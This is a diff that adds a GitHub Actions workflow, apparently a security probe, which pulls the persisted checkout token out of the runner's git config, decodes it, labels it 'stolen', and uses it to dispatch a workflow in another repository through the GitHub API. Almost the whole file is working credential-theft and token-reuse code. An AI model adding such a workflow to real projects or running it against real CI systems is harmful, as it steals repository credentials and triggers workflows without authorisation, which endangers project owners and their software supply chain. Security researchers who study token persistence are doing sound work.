@@ -1,0 +1,49 @@
+name: Dispatch Probe
+on:
+  workflow_dispatch:
+    inputs:
+      ref_to_dispatch:
+        description: ref
+        required: true
+        type: string
+permissions:
+  contents: read
+  actions: write
+jobs:
+  dispatch:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+      - name: Extract persisted checkout token path
+        id: tok
+        run: |
+          git config --local --show-origin --get-regexp '^includeIf\.gitdir:.*\.path$' | tee includeif.txt
+          cfg=$(awk '{print $NF}' includeif.txt | head -n1)
+          echo "cfg=$cfg" >> "$GITHUB_OUTPUT"
+          test -f "$cfg"
+          echo 'cfg_exists=yes'
+      - name: Dispatch target with persisted token
+        env:
+          REF_TO_DISPATCH: ${{ inputs.ref_to_dispatch }}
+        run: |
+          python3 - <<'PY'
+import json, os, re, subprocess, urllib.request
+cfg = subprocess.check_output(['git','config','--local','--show-origin','--get-regexp',r'^includeIf\.gitdir:.*\.path$'], text=True)
+path = cfg.strip().split()[-1]
+text = open(path).read()
+m = re.search(r'AUTHORIZATION:\s*basic\s+(.+)', text)
+if not m:
+    raise SystemExit('token_not_found')
+import base64
+raw = base64.b64decode(m.group(1)).decode()
+assert raw.startswith('x-access-token:')
+token = raw.split(':',1)[1]
+print('stolen_token_len=%d' % len(token))
+req = urllib.request.Request(
+    'https://api.github.com/repos/qsq8t65pxs/workerd/actions/workflows/dispatch-target.yml/dispatches',
+    data=json.dumps({'ref': os.environ['REF_TO_DISPATCH']}).encode(),
+    headers={'Authorization': f'Bearer {token}', 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json'},
+    method='POST')
+with urllib.request.urlopen(req) as resp:
+    print('dispatch_status=%d' % resp.status)
+PY
